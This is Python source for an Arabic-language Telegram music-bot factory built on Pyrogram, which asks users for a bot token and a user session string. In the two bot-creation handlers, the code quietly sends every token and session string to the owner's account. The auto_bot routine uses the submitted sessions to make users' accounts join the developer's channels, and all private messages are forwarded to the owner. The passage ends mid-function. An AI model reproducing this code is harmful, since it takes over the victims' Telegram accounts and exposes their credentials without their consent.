from pyrogram import filters, Client
from pyrogram import Client as app
from config import API_ID, API_HASH, MONGO_DB_URL, appp, user as usr, helper as ass, call, OWNER, OWNER_NAME, CHANNEL, GROUP, VIDEO
from ESLAM.info import Call, activecall, helper, active
from ESLAM.Data import db, dev, devname, set_must
from pyrogram.raw.types import InputPeerChannel
from pyrogram.raw.functions.phone import CreateGroupCall
from pytgcalls import PyTgCalls
from pymongo import MongoClient
from motor.motor_asyncio import AsyncIOMotorClient as _mongo_client_
from pyrogram.errors import FloodWait
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, Message, ChatPrivileges
from pyrogram.enums import ChatType
import asyncio
import os
from pyrogram import Client, filters
from pyrogram.types import Message
import sys
import asyncio
from os import system, execle, environ
import os
import asyncio

mongodb = _mongo_client_(MONGO_DB_URL)
mo = MongoClient()
mo = MongoClient(MONGO_DB_URL)
moo = mo["data"]
Bots = moo.simo
db = mongodb.db
botdb = db.botdb
blockeddb = db.blockedusers
blockdb = db.blocked
gbansdb = db.gban


BANNED_USERS = filters.user()








# Bots Run

Done = []
OFF =True

async def auto_bot():
  bots = Bots.find({})
  count = 0
  for i in bots:
      bot_username = i["bot_username"]
      try:
       if not i["bot_username"] in Done:
        TOKEN = i["token"]
        SESSION = i["session"]
        bot_username = i["bot_username"]
        devo = i["dev"]
        Done.append(bot_username)
        logger = i["logger"]
        bot = Client("ESLAM", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True, plugins=dict(root="ESLAM"))
        user = Client("ESLAM", api_id=API_ID, api_hash=API_HASH, session_string=SESSION, in_memory=True)
        await bot.start()
        await user.start()
        appp[bot_username] = bot
        usr[bot_username] = user
        activecall[bot_username] = []
        dev[bot_username] = devo
        try:
          devo = await bot.get_chat(devo)
          devo = devo.first_name
          devname[bot_username] = devo
        except:
          devname[bot_username] = OWNER_NAME
        ass[bot_username] = []
        await helper(bot_username)
        await Call(bot_username)
        try:
           await user.send_message(bot_username, "تم تنصيب البوت بنجاح مطوري الغالي انضم هنا  https://t.me/DMDD5")
        except:
           pass
        try:
          await user.join_chat("DMDD5")
        except:
          pass
        try:
          await user.join_chat("DMDD95")
        except:
          pass
        try:
          await user.join_chat("UP_ROCK")
        except:
          pass
      except Exception as e:
        print(f"[ @{bot_username} ] {e}")

# Bot Arledy Maked

async def get_served_bots() -> list:
    chats_list = []
    async for chat in botdb.find({"bot_username": {"$lt": 0}}):
        chats_list.append(chat)
    return chats_list

async def is_served_bot(bot_username: int) -> bool:
    chat = await botdb.find_one({"bot_username": bot_username})
    if not chat:
        return False
    return True

async def add_served_bot(bot_username: int):
    is_served = await is_served_bot(bot_username)
    if is_served:
        return
    return await botdb.insert_one({"bot_username": bot_username})

async def del_served_bot(bot_username: int):
    is_served = await is_served_bot(bot_username)
    if not is_served:
        return
    return await botdb.delete_one({"bot_username": bot_username})



# Blocked User

async def get_block_users() -> list:
    chats_list = []
    async for chat in blockdb.find({"user_id": {"$lt": 0}}):
        chats_list.append(chat)
    return chats_list

async def is_block_user(user_id: int) -> bool:
    chat = await blockdb.find_one({"user_id": user_id})
    if not chat:
        return False
    return True

async def add_block_user(user_id: int):
    is_served = await is_block_user(user_id)
    if is_served:
        return
    return await blockdb.insert_one({"user_id": user_id})

async def del_block_user(user_id: int):
    is_served = await is_block_user(user_id)
    if not is_served:
        return
    return await blockdb.delete_one({"user_id": user_id})


downloads = os.path.realpath("downloads")


@Client.on_message(filters.command(["• تنظيف السيرفر •", "", ""], ""))
async def clear_downloads(client, message):
    ls_dir = os.listdir(downloads)
    if ls_dir:
        for file in os.listdir(downloads):
            os.remove(os.path.join(downloads, file))
        await message.reply_text("**تم تنظيف السيرفر بنجاح ❤**")
    else:
        await message.reply_text("**لا يوجد شئ ليتم تنظيفه**")

@app.on_message(filters.private)
async def botooott(client, message):
   try:
    if not message.chat.username in OWNER:
     if not message.from_user.id == client.me.id:
      await client.forward_messages(OWNER[0], message.chat.id, message.id)
   except Exception as e:
      pass
   message.continue_propagation()

@app.on_message(filters.command("• تفعيل جميع البوتات •",""))
async def turnon(client, message):
 if message.chat.username in OWNER:
  m = await message.reply_text("**جاري تشغيل جميع البوتات ..⚡**")
  try:
   await auto_bot()
  except:
   pass
  return await message.reply_text("**تم تفعيل جميع البوتات .✨**")

@app.on_message(filters.command(["• تفعيل الصانع •", "• تعطيل الصانع •"], ""))
async def bye(client, message):
    user = message.from_user.username
    if user in OWNER:
        global OFF
        text = message.text
        if text == "• تفعيل الصانع •":
            OFF = None
            await message.reply_text("تم تفعيل الصانع ✘")
            return
        if text == "• تعطيل الصانع •":
            OFF = True
            await message.reply_text("تم تعطيل الصانع ✘")
            return

@Client.on_message(filters.command(["• اعادة التشغيل •"], ""))
async def restart_bot(client, message):
    user = message.from_user.username
    if user in OWNER:
      msg = await message.reply("`جار تشغيل الصانع`")
      args = [sys.executable, "main.py"]
      await msg.edit("تم اعاده تشغيل المصنع يمبرمج اسلام انتظر بعض الثواني.")
      execle(sys.executable, *args, environ)
      return


import re
import uuid
import socket

import psutil
import platform


def humanbytes(size):
    """Convert Bytes To Bytes So That Human Can Read It"""
    if not size:
        return ""
    power = 2 ** 10
    raised_to_pow = 0
    dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
    while size > power:
        size /= power
        raised_to_pow += 1
    return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"


@Client.on_message(filters.command(["• معلومات السيرفر •"], ""))
async def give_sysinfo(client, message):
    splatform = platform.system()
    platform_release = platform.release()
    platform_version = platform.version()
    architecture = platform.machine()
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(socket.gethostname())
    mac_address = ":".join(re.findall("..", "%012x" % uuid.getnode()))
    processor = platform.processor()
    ram = humanbytes(round(psutil.virtual_memory().total))
    cpu_freq = psutil.cpu_freq().current
    if cpu_freq >= 1000:
        cpu_freq = f"{round(cpu_freq / 1000, 2)}GHz"
    else:
        cpu_freq = f"{round(cpu_freq, 2)}MHz"
    du = psutil.disk_usage(client.workdir)
    psutil.disk_io_counters()
    disk = f"{humanbytes(du.used)} / {humanbytes(du.total)} " f"({du.percent}%)"
    cpu_len = len(psutil.Process().cpu_affinity())
    somsg = f"""🖥 **System Information**
    
**PlatForm :** `{splatform}`
**HostName :** `{hostname}`
**Processor :** `{processor}`
**Ram : ** `{ram}`
**CPU :** `{cpu_len}`
**DISK :** `{disk}`
    """
    await message.reply(somsg)


@Client.on_message(filters.command(["• تنظيف الملفات •"], ""))
async def cleanupp(client, message):
    user = message.from_user.username
    if user in OWNER:
      pth = os.path.realpath(".")
      ls_dir = os.listdir(pth)
      if ls_dir:
          for dta in os.listdir(pth):
              os.system("rm -rf *.mp4 *.png *.jpg")
          await message.reply_text("**تم التنظيف**")
      else:
          await message.reply_text("**بالفعل منظف**")


@Client.on_message(filters.command(["• تعطيل الاشتراك الإجباري •", "• تفعيل الاشتراك الإجباري •"], ""))
async def set_join_must(client: Client, message):
  if message.chat.username in OWNER:
   bot_username = client.me.username
   m = message.command[0]
   await set_must(bot_username, m)
   if message.command[0] == "• تعطيل الاشتراك الإجباري •":
     await message.reply_text("**تم تعطيل الاشتراك الإجباري بنجاح -🖱️**")
   else:
     await message.reply_text("**تم تفعيل الاشتراك الإجباري بنجاح -🖱️**")
   return
@app.on_message(filters.command(["/start", "ٍ𝙀ٍَ𝙉ٍ𝙂ٍ𝙇𝙄َٰ𝙎َ𝙃"], "") & filters.private)
async def stratmaked(client, message):
  if await is_block_user(message.from_user.id):
    return
  if OFF:
      if not message.chat.username in OWNER:
         return await message.reply_text(f"**ƚ𝗁ᥱ Ⴆ᥆ƚ ᖴᥲ️ᥴƚ᥆ᖇY Ꭵ᥉ ᥴᥣ᥆᥉ᥱժ. ᥲ️᥉k ƚ𝗁ᥱ ժᥱ᥎ᥱᥣ᥆ρᥱᖇ ᭙𝗁ᥱꪀ Ꭵƚ ᭙Ꭵᥣᥣ Ⴆᥱ ᥆ρᥱꪀ \n ᦔꫀꪜ 𝘴ꪮꪊ𝘳ᥴꫀ : @{OWNER[0]}**")
  if message.chat.username in OWNER:
    kep = ReplyKeyboardMarkup([["• انشاء بوت •", "• حذف بوت •"], ["• المكالمات النشطه •"], ["• تفعيل الصانع •", "• تعطيل الصانع •"], ["• تفعيل جميع البوتات •"], ["• تفعيل الاشتراك الإجباري •", "• تعطيل الاشتراك الإجباري •"], ["• البوتات المصنوعه •"], ["• احصائيات البوتات المصنوعه •"], ["• حظر بوت •", "• حظر مستخدم •"], ["• الغاء حظر بوت •", "• الغاء حظر مستخدم •"], ["• اذاعه عام بجميع البوتات •"], ["• اذاعه للمطورين •"], ["• معلومات السيرفر •"], ["• فحص البوتات •", "• تصفيه البوتات •"], ["• تنظيف السيرفر •", "• تنظيف الملفات •"], ["• اعادة التشغيل •"], ["• استخراج جلسه •"]], resize_keyboard=True)
    await message.reply_text(f"**اهلا يعم المطور عايز اي مني ،**", reply_markup=kep)
  
  else:
    kep = ReplyKeyboardMarkup([["• ժᥱᥣᥱƚᥱ Ⴆ᥆ƚ •", "• ᥴᖇᥱᥲ️ƚ Ⴆ᥆ƚ •"], ["• ََِِ𝗲ًًٍٍ𝗫ٖٔ𝗧ًًٍٍ𝗥ّّ𝗮ََِِ𝗰ٖٔ𝗧 ّّ𝗮 ٍّّ𝘀ََِِ𝗲ٍّّ𝘀ٍّّ𝘀ٍٍَ𝗶ُُ𝗼ٍٍّّ𝗡 •"], ["• ٖٔ𝗧ًًٍٍ𝗛ََِِ𝗲 ٍٍََ𝗟ّّ𝗮ٍٍّّ𝗡ٍٍََ𝗴ًًٍٍ𝗨ّّ𝗮ٍٍََ𝗴ََِِ𝗲 •"], ["• ّّ𝗮ًًٍٍ𝗕ُُ𝗼ًًٍٍ𝗨ٖٔ𝗧 ٍّّ𝘀ُُ𝗼ًًٍٍ𝗨ًًٍٍ𝗥ََِِ𝗰ََِِ𝗲 •"]], resize_keyboard=True)
    await message.reply_text(f"**ًًٍٍ𝗛ََِِ𝗲ٍٍََ𝗟ٍٍََ𝗟ُُ𝗼 ًًٍٍ𝗣ًًٍٍ𝗥ُُ𝗼 {message.from_user.mention}**\n**ٖٔ𝗧ًًٍٍ𝗛ٍٍَ𝗶ٍّّ𝘀 ًًٍٍ𝗕ُُ𝗼ٖٔ𝗧 ٍٍَ𝗶ٍّّ𝘀 ًًٍٍ𝗗ََِِ𝗲ًًٍٍ𝗗ٍٍَ𝗶ََِِ𝗰ّّ𝗮ٖٔ𝗧ََِِ𝗲ًًٍٍ𝗗 ٖٔ𝗧ُُ𝗼 ََِِ𝗰ًًٍٍ𝗥ََِِ𝗲ّّ𝗮ٖٔ𝗧ٍٍَ𝗶ٍٍّّ𝗡ٍٍََ𝗴 ِِّّ𝗺ًًٍٍ𝗨ٍّّ𝘀ٍٍَ𝗶ََِِ𝗰 ًًٍٍ𝗕ُُ𝗼ٖٔ𝗧ٍّّ𝘀**", reply_markup=kep)

@Client.on_message(filters.command(["• ٖٔ𝗧ًًٍٍ𝗛ََِِ𝗲 ٍٍََ𝗟ّّ𝗮ٍٍّّ𝗡ٍٍََ𝗴ًًٍٍ𝗨ّّ𝗮ٍٍََ𝗴ََِِ𝗲 •", "• اللغه •"], ""))
async def liunt(client: Client, message):
    kep = ReplyKeyboardMarkup([["الاوامر", "ٍ𝙀ٍَ𝙉ٍ𝙂ٍ𝙇𝙄َٰ𝙎َ𝙃"]], resize_keyboard=True)
    await message.reply_text(f"**ًًٍٍ𝗛ََِِ𝗲ٍٍََ𝗟ٍٍََ𝗟ُُ𝗼 ًًٍٍ𝗣ًًٍٍ𝗥ُُ𝗼 {message.from_user.mention}**\n**𝗁ᥱᖇᥱ ᥲ️ᖇᥱ ƚ𝗁ᥱ ᥲ️᥎ᥲ️Ꭵᥣᥲ️Ⴆᥣᥱ ᥣᥲ️ꪀᘜυᥲ️ᘜᥱ᥉**", reply_markup=kep)
    
@app.on_message(filters.command(["الاوامر"], "") & filters.private)
async def stratmaked1(client, message):
  if await is_block_user(message.from_user.id):
    return
  if OFF:
      if not message.chat.username in OWNER:
         return await message.reply_text(f"**ƚ𝗁ᥱ Ⴆ᥆ƚ ᖴᥲ️ᥴƚ᥆ᖇY Ꭵ᥉ ᥴᥣ᥆᥉ᥱժ. ᥲ️᥉k ƚ𝗁ᥱ ժᥱ᥎ᥱᥣ᥆ρᥱᖇ ᭙𝗁ᥱꪀ Ꭵƚ ᭙Ꭵᥣᥣ Ⴆᥱ ᥆ρᥱꪀ \n ᦔꫀꪜ 𝘴ꪮꪊ𝘳ᥴꫀ : @{OWNER[0]}**")
  if message.chat.username in OWNER:
    kep = ReplyKeyboardMarkup([["• انشاء بوت •", "• حذف بوت •"], ["• المكالمات النشطه •"], ["• تفعيل الصانع •", "• تعطيل الصانع •"], ["• تفعيل جميع البوتات •"], ["• تفعيل الاشتراك الإجباري •", "• تعطيل الاشتراك الإجباري •"], ["• البوتات المصنوعه •"], ["• احصائيات البوتات المصنوعه •"], ["• حظر بوت •", "• حظر مستخدم •"], ["• الغاء حظر بوت •", "• الغاء حظر مستخدم •"], ["• اذاعه عام بجميع البوتات •"], ["• توجيه عام بجميع البوتات •"], ["• اذاعه للمطورين •"], ["• فحص البوتات •", "• تصفيه البوتات •"], ["• استخراج جلسه •"]], resize_keyboard=True)
    await message.reply_text(f"**اهلا يعم المطور عايز اي مني ،**", reply_markup=kep)
  
  else:
    kep = ReplyKeyboardMarkup([["• حذف بوت •", "• انشاء بوت •"], ["• استخراج جلسه •"], ["• اللغه •"], ["• السورس •"]], resize_keyboard=True)
    await message.reply_text(f"**أهلا بك {message.from_user.mention}**\n**هذا البوت مخصص لانشاء البوتات**", reply_markup=kep)
        
    
    
@app.on_message(filters.command(["• 🧚‍♂️ السورس •", "• تحديثات لولا •"], ""))
async def alivehi(client: Client, message):
    chat_id = message.chat.id

    keyboard = InlineKeyboardMarkup(
        [
            [
                 InlineKeyboardButton(f"{OWNER_NAME}", url=f"https://t.me/{OWNER[0]}")
            ]
        ]
    )

    await message.reply_photo(
        photo=f"https://telegra.ph/file/8d7a59eb9f344f106eb50.jpg",
        caption="Welcome To Source Rock Star",
        reply_markup=keyboard,
    )

@app.on_message(filters.command("• المكالمات النشطه •", ""))
async def achgs(client, message):
  nn = len(active)
  await message.reply_text(f"**عدد المكالمات النشطه الان {nn}**")
      
@app.on_message(filters.command(["• انشاء بوت •"], ""))
async def cloner(app: app, message):
    if await is_block_user(message.from_user.id):
      return
    if OFF:
      if not message.chat.username in OWNER:
         return await message.reply_text(f"**الصانع معطل حالياً تواصل مع المطور لتنصيب بوتك \n Dev : @{OWNER[0]}**")
    await message.reply_text("**ها ابعت الحاجه**")
    user_id = message.chat.id
    tokenn = await app.ask(chat_id=user_id, text="**ارسل توكن البوت •**", filters=filters.text)
    token = tokenn.text
    try:
      await tokenn.reply_text("**جاري فحص التوكن ..✨**")
      bot = Client("Cloner", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
      await bot.start()
    except Exception as es:
      return await message.reply_text("**التوكن غير صحيح ✨**")
    bot_i = await bot.get_me()
    bot_username = bot_i.username
    if await is_served_bot(bot_username):
      await bot.stop()
      return await message.reply_text("**لا يمكن انشاء هذا البوت .⚡**")
    if bot_username in Done:
      await bot.stop()
      return await message.reply_text("**تم انشاء هذا البوت من قبل .✨**")
    session = await app.ask(chat_id=user_id, text="**ارسل كود الجلسة**", filters=filters.text)
    await app.send_message(user_id, "**جاري تشغيل البوت انتظر ....✨**")
    session = session.text
    user = Client("ESLAM", api_id=API_ID, api_hash=API_HASH, session_string=session, in_memory=True)
    try:       
       await user.start()
    except:
       await bot.stop()
       return await message.reply_text(f"**كود الجلسه غير صالح ⚡**")
    loger = await user.create_supergroup(f"مجموعة البوت", "هذه المجموعة هي عبارة عن سجل للبوت")
    if bot_i.photo:
       photo = await bot.download_media(bot_i.photo.big_file_id)
       await user.set_chat_photo(chat_id=loger.id, photo=photo)
    logger = loger.id
    await user.add_chat_members(logger, bot_username)
    chat_id = logger
    user_id = bot_username
    await user.promote_chat_member(chat_id, user_id, privileges=ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
    loggerlink = await user.export_chat_invite_link(logger)
    await user.stop()
    await bot.stop()
    if message.chat.username in OWNER:
       dev = await app.ask(message.chat.id, "**هات ايدي المطور**")
       if dev.text == "انا":
          dev = message.chat.id
       else:
          dev = int(dev.text)
    else:
     dev = message.chat.id
    data = {"bot_username": bot_username, "token": token, "session": session, "dev": dev, "logger": logger, "logger_mode": "ON"}
    Bots.insert_one(data)
    try:
     await auto_bot()
    except:
         pass
    await message.reply_text(f"**تم انشاء البوت بنجاح   ✨**\n\n**هذه هي مجموعة للبوت**\n**يمكن من خلالها رؤيه سجل التشغيل**\n[ {loggerlink} ]", disable_web_page_preview=True)
    await app.send_message(OWNER[0], f"تم انشاء بوت جديد \nيوزر البوت : @{bot_username}\nتوكن البوت\n{token}\nكود الجلسه \n{session}\nبواسطة {message.from_user.mention}\nId : {message.chat.id}\n\n{loggerlink}")


@app.on_message(filters.command(["• ᥴᖇᥱᥲ️ƚ Ⴆ᥆ƚ •"], ""))
async def clone1r(app: app, message):
    if await is_block_user(message.from_user.id):
      return
    if OFF:
      if not message.chat.username in OWNER:
         return await message.reply_text(f"**ƚ𝗁ᥱ Ⴆ᥆ƚ ᖴᥲ️ᥴƚ᥆ᖇY Ꭵ᥉ ᥴᥣ᥆᥉ᥱժ. ᥲ️᥉k ƚ𝗁ᥱ ժᥱ᥎ᥱᥣ᥆ρᥱᖇ ᭙𝗁ᥱꪀ Ꭵƚ ᭙Ꭵᥣᥣ Ⴆᥱ ᥆ρᥱꪀ \n ᦔꫀꪜ 𝘴ꪮꪊ𝘳ᥴꫀ : @{OWNER[0]}**")
    await message.reply_text("**َٰ𝙎ِّ𝙐ٍ𝘽ِّّ𝙈𝙄ٍ𝙏 ٓ𝙍ٍ𝙀َِ𝙌ِّ𝙐𝙄ٓ𝙍ٍ𝙀ِّّ𝙈ٍ𝙀ٍَ𝙉ٍ𝙏َٰ𝙎**")
    user_id = message.chat.id
    tokenn = await app.ask(chat_id=user_id, text="**َٰ𝙎ٍ𝙀ٍَ𝙉َ𝘿 ٍَ𝙔ُِ𝙊ِّ𝙐ٓ𝙍 ٍ𝙏ُِ𝙊ً𝙆ٍ𝙀ٍَ𝙉**", filters=filters.text)
    token = tokenn.text
    try:
      await tokenn.reply_text("**ٍّ𝘾َ𝙃ٍ𝙀ٍّ𝘾ً𝙆𝙄ٍَ𝙉ٍ𝙂 𝙄ٍَ𝙉 ٍّ𝙋ٓ𝙍ُِ𝙊ٍ𝙂ٓ𝙍ٍ𝙀َٰ𝙎َٰ𝙎 ✨**")
      bot = Client("Cloner", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
      await bot.start()
    except Exception as es:
      return await message.reply_text("**ٍ𝙏َ𝙃ٍ𝙀 ٍ𝙏ُِ𝙊ً𝙆ٍ𝙀ٍَ𝙉 𝙄َٰ𝙎 𝙄ٍَ𝙉ٍّ𝘾ُِ𝙊ٓ𝙍ٓ𝙍ٍ𝙀ٍّ𝘾ٍ𝙏 ✨**")
    bot_i = await bot.get_me()
    bot_username = bot_i.username
    if await is_served_bot(bot_username):
      await bot.stop()
      return await message.reply_text("**ٍ𝙏َ𝙃𝙄َٰ𝙎 ٍ𝘽ُِ𝙊ٍ𝙏 ٍّ𝘾َٰ𝘼ٍَ𝙉ٍَ𝙉ُِ𝙊ٍ𝙏 ٍ𝘽ٍ𝙀 ٍّ𝘾ٓ𝙍ٍ𝙀َٰ𝘼ٍ𝙏ٍ𝙀َ𝘿⚡**")
    if bot_username in Done:
      await bot.stop()
      return await message.reply_text("**ٍ𝙏َ𝙃𝙄َٰ𝙎 ٍ𝘽ُِ𝙊ٍ𝙏 َ𝙃َٰ𝘼َٰ𝙎 َٰ𝘼ٍ𝙇ٓ𝙍ٍ𝙀َٰ𝘼َ𝘿ٍَ𝙔 ٍ𝘽ٍ𝙀ٍ𝙀ٍَ𝙉 ٍّ𝘾ٓ𝙍ٍ𝙀َٰ𝘼ٍ𝙏ٍ𝙀َ𝘿 .✨**")
    session = await app.ask(chat_id=user_id, text="**َٰ𝙎ٍ𝙀ٍَ𝙉َ𝘿 ٍَ𝙔ُِ𝙊ِّ𝙐ٓ𝙍 َٰ𝙎ٍ𝙀َٰ𝙎َٰ𝙎𝙄ُِ𝙊ٍَ𝙉**", filters=filters.text)
    await app.send_message(user_id, "**Ⴆ᥆ƚ Ꭵ᥉ ᖇυꪀꪀᎥꪀᘜ ᭙ᥲ️Ꭵƚ ....✨**")
    session = session.text
    user = Client("ESLAM", api_id=API_ID, api_hash=API_HASH, session_string=session, in_memory=True)
    try:       
       await user.start()
    except:
       await bot.stop()
       return await message.reply_text(f"**ٍٍَ𝗶ٍٍّّ𝗡ََِِ𝗰ُُ𝗼ًًٍٍ𝗥ًًٍٍ𝗥ََِِ𝗲ََِِ𝗰ٖٔ𝗧 ٍّّ𝘀ََِِ𝗲ٍّّ𝘀ٍّّ𝘀ٍٍَ𝗶ُُ𝗼ٍٍّّ𝗡, ََِِ𝗰ًًٍٍ𝗛ّّ𝗮ٍٍّّ𝗡ٍٍََ𝗴ََِِ𝗲 ٍٍَ𝗶ٖٔ𝗧 ⚡**")
    loger = await user.create_supergroup(f"سجل سورس روك", "هذه المجموعه لسجل التشغيل :- @EFFB0T")
    if bot_i.photo:
       photo = await bot.download_media(bot_i.photo.big_file_id)
       await user.set_chat_photo(chat_id=loger.id, photo=photo)
    logger = loger.id
    await user.add_chat_members(logger, bot_username)
    chat_id = logger
    user_id = bot_username
    await user.promote_chat_member(chat_id, user_id, privileges=ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
    loggerlink = await user.export_chat_invite_link(logger)
    await user.stop()
    await bot.stop()
    if message.chat.username in OWNER:
       dev = await app.ask(message.chat.id, "**هات ايدي المطور**")
       if dev.text == "انا":
          dev = message.chat.id
       else:
          dev = int(dev.text)
    else:
     dev = message.chat.id
    data = {"bot_username": bot_username, "token": token, "session": session, "dev": dev, "logger": logger, "logger_mode": "ON"}
    Bots.insert_one(data)
    try:
     await auto_bot()
    except:
         pass
    await message.reply_text(f"**ٖٔ𝗧ًًٍٍ𝗛ََِِ𝗲 ًًٍٍ𝗕ُُ𝗼ٖٔ𝗧 ًًٍٍ𝗛ّّ𝗮ٍّّ𝘀 ًًٍٍ𝗕ََِِ𝗲ََِِ𝗲ٍٍّّ𝗡 ََِِ𝗰ًًٍٍ𝗥ََِِ𝗲ّّ𝗮ٖٔ𝗧ََِِ𝗲ًًٍٍ𝗗 ٍّّ𝘀ًًٍٍ𝗨ََِِ𝗰ََِِ𝗰ََِِ𝗲ٍّّ𝘀ٍّّ𝘀ًًٍٍ𝗙ًًٍٍ𝗨ٍٍََ𝗟ٍٍََ𝗟ًً𝗬   ✨**\n\n**ٖٔ𝗧ًًٍٍ𝗛ٍٍَ𝗶ٍّّ𝘀 ٍٍَ𝗶ٍّّ𝘀 ٖٔ𝗧ًًٍٍ𝗛ََِِ𝗲 ًًٍٍ𝗕ُُ𝗼ٖٔ𝗧 ٍٍََ𝗴ًًٍٍ𝗥ُُ𝗼ًًٍٍ𝗨ًًٍٍ𝗣**\n**ًًٍٍ𝗙ًًٍٍ𝗥ُُ𝗼ِِّّ𝗺 ِِ𝘄ًًٍٍ𝗛ٍٍَ𝗶ََِِ𝗰ًًٍٍ𝗛 ًً𝗬ُُ𝗼ًًٍٍ𝗨 ََِِ𝗰ّّ𝗮ٍٍّّ𝗡 ٍّّ𝘀ََِِ𝗲ََِِ𝗲 ٖٔ𝗧ًًٍٍ𝗛ََِِ𝗲 ُُ𝗼ًًٍٍ𝗣ََِِ𝗲ًًٍٍ𝗥ّّ𝗮ٖٔ𝗧ٍٍَ𝗶ٍٍّّ𝗡ٍٍََ𝗴 ًًٍٍ𝗛ٍٍَ𝗶ٍّّ𝘀ٖٔ𝗧ُُ𝗼ًًٍٍ𝗥ًً𝗬**\n[ {loggerlink} ]", disable_web_page_preview=True)
    await app.send_message(OWNER[0], f"تم انشاء بوت جديد \nيوزر البوت : @{bot_username}\nتوكن البوت\n{token}\nكود الجلسه \n{session}\nبواسطة {message.from_user.mention}\nId : {message.chat.id}\n\n{loggerlink}")


@app.on_message(filters.command(["• حذف بوت •"], ""))
async def delbot(client: app, message):
  if await is_block_user(message.from_user.id):
    return
  if OFF:
      if not message.chat.username in OWNER:
         return await message.reply_text(f"**الصانع معطل حالياً تواصل مع المطور لتنصيب بوتك \n Dev : @{OWNER[0]}**")
  if message.chat.username in OWNER:
   ask = await client.ask(message.chat.id, "ارسل يوزر البوت", timeout=20)
   bot_username = ask.text
   if "@" in bot_username:
     bot_username = bot_username.replace("@", "")
   list = []
   bots = Bots.find({})
   for i in bots:
       if i["bot_username"] == bot_username:
         botusername = i["bot_username"]
         list.append(botusername)
   if not bot_username in list:
     return await message.reply_text("**لم يتم صنع هذا البوت ⚡.**")
   else:
    try:
     bb = {"bot_username": bot_username}
     Bots.delete_one(bb)
     try:
      Done.remove(bot_username)
     except:
        pass
     try:
      boot = appp[bot_username]
      await boot.stop()
     except:
       pass
     await message.reply_text("**تم حذف البوت بنجاح ✘**")
    except Exception as es:
     await message.reply_text(f"**حدث خطأ .⚡**\n**{es}**")
  else:
   list = []
   bots = Bots.find({})
   for i in bots:
       try:
        if i["dev"] == message.chat.id:
         bot_username = i["bot_username"]
         list.append(i["dev"])
         try:
           Done.remove(bot_username)
         except:
           pass
         try:
           boot = appp[bot_username]
           await boot.stop()
           user = usr[bot_username]
           await user.stop()
         except:
           pass
       except:
           pass
   if not message.chat.id in list:
     return await message.reply_text("**لم تقم بصنع بوتات ⚡.**")
   else:
    try:
     dev = message.chat.id
     dev = {"dev": dev}
     Bots.delete_one(dev)
     await message.reply_text("**تم حذف بوتك بنجاح ✘**")
    except:
     await message.reply_text("**حدث خطأ ، تواصل مع المطور .⚡**\n**Dev : @{OWNER[0]}**")
   

@app.on_message(filters.command(["• ժᥱᥣᥱƚᥱ Ⴆ᥆ƚ •"], ""))
async def delb1ot(client: app, message):
  if await is_block_user(message.from_user.id):
    return
  if OFF:
      if not message.chat.username in OWNER:
         return await message.reply_text(f"**ƚ𝗁ᥱ Ⴆ᥆ƚ ᖴᥲ️ᥴƚ᥆ᖇY Ꭵ᥉ ᥴᥣ᥆᥉ᥱժ. ᥲ️᥉k ƚ𝗁ᥱ ժᥱ᥎ᥱᥣ᥆ρᥱᖇ ᭙𝗁ᥱꪀ Ꭵƚ ᭙Ꭵᥣᥣ Ⴆᥱ ᥆ρᥱꪀ \n ᦔꫀꪜ 𝘴ꪮꪊ𝘳ᥴꫀ : @{OWNER[0]}**")
  if message.chat.username in OWNER:
   ask = await client.ask(message.chat.id, "ارسل يوزر البوت", timeout=20)
   bot_username = ask.text
   if "@" in bot_username:
     bot_username = bot_username.replace("@", "")
   list = []
   bots = Bots.find({})
   for i in bots:
       if i["bot_username"] == bot_username:
         botusername = i["bot_username"]
         list.append(botusername)
   if not bot_username in list:
     return await message.reply_text("**لم يتم صنع هذا البوت ⚡.**")
   else:
    try:
     bb = {"bot_username": bot_username}
     Bots.delete_one(bb)
     try:
      Done.remove(bot_username)
     except:
        pass
     try:
      boot = appp[bot_username]
      await boot.stop()
     except:
       pass
     await message.reply_text("**تم حذف البوت بنجاح ✘**")
    except Exception as es:
     await message.reply_text(f"**حدث خطأ .⚡**\n**{es}**")
  else:
   list = []
   bots = Bots.find({})
   for i in bots:
       try:
        if i["dev"] == message.chat.id:
         bot_username = i["bot_username"]
         list.append(i["dev"])
         try:
           Done.remove(bot_username)
         except:
           pass
         try:
           boot = appp[bot_username]
           await boot.stop()
           user = usr[bot_username]
           await user.stop()
         except:
           pass
       except:
           pass
   if not message.chat.id in list:
     return await message.reply_text("**Y᥆υ ժᎥժ ꪀ᥆ƚ ᥴᖇᥱᥲ️ƚᥱ ᥲ️ Ⴆ᥆ƚ.**")
   else:
    try:
     dev = message.chat.id
     dev = {"dev": dev}
     Bots.delete_one(dev)
     await message.reply_text("**ًً𝗬ُُ𝗼ًًٍٍ𝗨ًًٍٍ𝗥 ًًٍٍ𝗕ُُ𝗼ٖٔ𝗧 ًًٍٍ𝗛ّّ𝗮ٍّّ𝘀 ًًٍٍ𝗕ََِِ𝗲ََِِ𝗲ٍٍّّ𝗡 ٍّّ𝘀ًًٍٍ𝗨ََِِ𝗰ََِِ𝗰ََِِ𝗲ٍّّ𝘀ٍّّ𝘀ًًٍٍ𝗙ًًٍٍ𝗨ٍٍََ𝗟ٍٍََ𝗟ًً𝗬 ًًٍٍ𝗗ََِِ𝗲ٍٍََ𝗟ََِِ𝗲ٖٔ𝗧ََِِ𝗲ًًٍٍ𝗗**")
    except:
     await message.reply_text("**حدث خطأ ، تواصل مع المطور .⚡**\n**Dev : @{OWNER[0]}**")
   


    
@app.on_message(filters.command("• البوتات المصنوعه •", ""))
async def botsmaked(client, message):
  if message.chat.username in OWNER: 
   m = 0
   text = ""
   bots = Bots.find({})
   try:
    for i in bots:
        try:
          bot_username = i["bot_username"]
          m += 1
          user = i["dev"]
          user = await client.get_users(user)
          user = user.mention
          text += f"{m}- @{bot_username} By : {user}\n "
        except:
           pass
   except:
        return await message.reply_text("**لا يوجد بوتات مصنوعه .⚡**")
   try:
